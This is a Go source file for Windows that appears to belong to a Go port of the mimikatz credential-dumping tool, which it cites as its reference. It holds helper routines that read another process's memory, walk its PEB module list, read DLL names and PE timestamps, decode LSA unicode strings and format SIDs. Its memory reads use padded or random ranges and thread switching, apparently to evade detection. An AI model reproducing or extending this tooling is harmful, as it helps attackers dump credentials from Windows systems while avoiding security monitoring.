// +build windows

package kiwi

import (
	"fmt"
	"reflect"
	"runtime"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/security"
)

func (kiwi *Kiwi) isWow64() (bool, error) {
	if kiwi.wow64 != 0 {
		return kiwi.wow64 == 1, nil
	}
	isWow64, err := api.IsWow64Process(windows.CurrentProcess())
	if err != nil {
		return false, err
	}
	if isWow64 {
		kiwi.wow64 = 1
	} else {
		kiwi.wow64 = 2
	}
	return isWow64, nil
}

// readMemory is used to read process memory with random range. // #nosec
func (kiwi *Kiwi) readMemory(pHandle windows.Handle, address uintptr, buffer *byte, size uintptr) error {
	// TODO recovery random
	// randomFrontSize := uintptr(128 + kiwi.rand.Int(128))
	// randomBackSize := uintptr(128 + kiwi.rand.Int(128))
	randomFrontSize := uintptr(64) // don't edit it unless you known what you do!
	randomBackSize := uintptr(64)  // don't edit it unless you known what you do!
	buf := make([]byte, randomFrontSize+size+randomBackSize)
	_, err := api.ReadProcessMemory(pHandle, address-randomFrontSize, &buf[0], uintptr(len(buf)))
	if err != nil {
		return err
	}
	var dst []byte
	dstSH := (*reflect.SliceHeader)(unsafe.Pointer(&dst))
	dstSH.Len = int(size)
	dstSH.Cap = int(size)
	dstSH.Data = uintptr(unsafe.Pointer(buffer))
	copy(dst, buf[randomFrontSize:randomFrontSize+size])
	runtime.KeepAlive(buffer)
	return nil
}

// readMemoryEnd is used to read process memory with random range, but without front. // #nosec
func (kiwi *Kiwi) readMemoryEnd(pHandle windows.Handle, address uintptr, buffer *byte, size uintptr) error {
	// TODO recovery random
	// randomFrontSize := uintptr(128 + kiwi.rand.Int(128))
	// randomBackSize := uintptr(128 + kiwi.rand.Int(128))
	randomBackSize := uintptr(32) // don't edit it unless you known what you do!
	buf := make([]byte, size+randomBackSize)
	_, err := api.ReadProcessMemory(pHandle, address, &buf[0], uintptr(len(buf)))
	if err != nil {
		return err
	}
	var dst []byte
	dstSH := (*reflect.SliceHeader)(unsafe.Pointer(&dst))
	dstSH.Len = int(size)
	dstSH.Cap = int(size)
	dstSH.Data = uintptr(unsafe.Pointer(buffer))
	copy(dst, buf[:size])
	runtime.KeepAlive(&buffer)
	return nil
}

// #nosec
func (kiwi *Kiwi) readLSAUnicodeString(pHandle windows.Handle, lus *api.LSAUnicodeString) (string, error) {
	if lus.MaximumLength == 0 || lus.Length == 0 {
		return "", nil
	}
	// read data
	data := make([]byte, int(lus.MaximumLength))
	err := kiwi.readMemory(pHandle, lus.Buffer, &data[0], uintptr(lus.MaximumLength))
	if err != nil {
		return "", err
	}
	// make string
	var utf16Str []uint16
	sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
	sh.Len = int(lus.Length / 2)
	sh.Cap = int(lus.Length / 2)
	sh.Data = uintptr(unsafe.Pointer(&data[:lus.Length][0]))
	return string(utf16.Decode(utf16Str)), nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/modules/kull_m_process.c

type basicModuleInfo struct {
	name      string
	address   uintptr
	size      int
	timestamp uint32
}

// #nosec
func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
	// read PEB base address
	donePEB := security.SwitchThreadAsync()
	defer kiwi.waitSwitchThreadAsync(donePEB)
	infoClass := api.InfoClassProcessBasicInformation
	var pbi api.ProcessBasicInformation
	size := unsafe.Sizeof(pbi)
	_, err := api.NTQueryInformationProcess(pHandle, infoClass, (*byte)(unsafe.Pointer(&pbi)), size)
	if err != nil {
		return nil, err
	}
	kiwi.logf(logger.Debug, "PEB base address is 0x%X", pbi.PEBBaseAddress)
	// read and calculate PEB.LoaderData address
	doneLoader := security.SwitchThreadAsync()
	defer kiwi.waitSwitchThreadAsync(doneLoader)
	randomOffset := uintptr(4 + kiwi.rand.Int(4))
	size = uintptr(256 + kiwi.rand.Int(512))
	buf := make([]byte, size)
	_, err = api.ReadProcessMemory(pHandle, pbi.PEBBaseAddress+randomOffset, &buf[0], size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB loader data address")
	}
	loaderDataOffset := unsafe.Offsetof(api.PEB{}.LoaderData)
	addressOffset := loaderDataOffset - randomOffset
	loaderDataAddress := *(*uintptr)(unsafe.Pointer(&buf[addressOffset]))
	kiwi.logf(logger.Debug, "loader data address is 0x%X", loaderDataAddress)
	// read PEB loader data
	var loaderData api.PEBLDRData
	size = unsafe.Sizeof(loaderData)
	err = kiwi.readMemory(pHandle, loaderDataAddress, (*byte)(unsafe.Pointer(&loaderData)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB loader data")
	}
	// read loader data table entry
	entryLoader := security.SwitchThreadAsync()
	defer kiwi.waitSwitchThreadAsync(entryLoader)
	offset := unsafe.Offsetof(api.LDRDataTableEntry{}.InMemoryOrderLinks)
	begin := loaderData.InMemoryOrderModuleVector.FLink - offset
	end := loaderDataAddress + unsafe.Offsetof(api.PEBLDRData{}.InLoadOrderModuleVector)
	kiwi.logf(logger.Debug, "read loader data table entry, begin: 0x%X, end: 0x%X", begin, end)
	var (
		modules []*basicModuleInfo
		entry   api.LDRDataTableEntry
	)
	// prevent dead loop
	ticker := time.NewTicker(3 * time.Millisecond)
	defer ticker.Stop()
	for address := begin; address < end; address = entry.InMemoryOrderLinks.FLink - offset {
		// prevent dead loop
		select {
		case <-ticker.C:
		case <-kiwi.context.Done():
			return nil, kiwi.context.Err()
		}
		// read entry
		size = unsafe.Sizeof(entry)
		err = kiwi.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&entry)), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read loader data table entry")
		}
		// read base dll name
		name, err := kiwi.readLSAUnicodeString(pHandle, &entry.BaseDLLName)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read base dll name")
		}
		// read time date stamp
		timestamp, err := kiwi.getModuleTimestamp(pHandle, entry.DLLBase)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read time date stamp")
		}
		// add module
		modules = append(modules, &basicModuleInfo{
			name:      name,
			address:   entry.DLLBase,
			size:      int(entry.SizeOfImage),
			timestamp: timestamp,
		})
	}
	kiwi.log(logger.Debug, "loaded module count:", len(modules))
	return modules, nil
}

type simpleDOSHeader struct {
	magic    uint16 // MZ
	_        [60 - 2]byte
	fileAddr int32
}

// nolint:structcheck, unused
type peFileHeader struct {
	magic                uint32 // PE
	machine              uint16
	numberOfSections     uint16
	timeDateStamp        uint32
	pointerToSymbolTable uint32
	numberOfSymbols      uint32
	sizeOfOptionalHeader uint16
	characteristics      uint16
}

// #nosec
func (kiwi *Kiwi) getModuleTimestamp(pHandle windows.Handle, address uintptr) (uint32, error) {
	const (
		dosHeaderMagic = 0x5A4D
		peHeaderMagic  = 0x4550
	)
	// read dos header
	var dosHeader simpleDOSHeader
	size := unsafe.Sizeof(simpleDOSHeader{})
	err := kiwi.readMemoryEnd(pHandle, address, (*byte)(unsafe.Pointer(&dosHeader)), size)
	if err != nil {
		return 0, errors.WithMessage(err, "failed to read dos header")
	}
	if dosHeader.magic != dosHeaderMagic {
		return 0, errors.New("read invalid dos header")
	}
	// read PE file header
	address += uintptr(dosHeader.fileAddr)
	var fileHeader peFileHeader
	size = unsafe.Sizeof(fileHeader)
	err = kiwi.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&fileHeader)), size)
	if err != nil {
		return 0, errors.WithMessage(err, "failed to read pe file header")
	}
	if fileHeader.magic != peHeaderMagic {
		return 0, errors.New("read invalid pe file header")
	}
	return fileHeader.timeDateStamp, nil
}

func (kiwi *Kiwi) readSID(pHandle windows.Handle, address uintptr) (string, error) {
	var n byte
	err := kiwi.readMemory(pHandle, address+1, &n, 1)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read number about SID")
	}
	// version + number + SID identifier authority + value
	size := uintptr(1 + 1 + 6 + 4*n)
	buf := make([]byte, size)
	err = kiwi.readMemory(pHandle, address, &buf[0], size)
	if err != nil {
		return "", errors.WithMessage(err, "failed to read SID")
	}
	// identifier authority
	ia := convert.BEBytesToUint32(buf[4:8])
	format := "S-%d-%d" + strings.Repeat("-%d", int(n))
	// format SID
	v := []interface{}{buf[0], ia}
	for i := 1 + 1 + 6; i < len(buf); i += 4 {
		v = append(v, convert.LEBytesToUint32(buf[i:i+4]))
	}
	return fmt.Sprintf(format, v...), nil
}
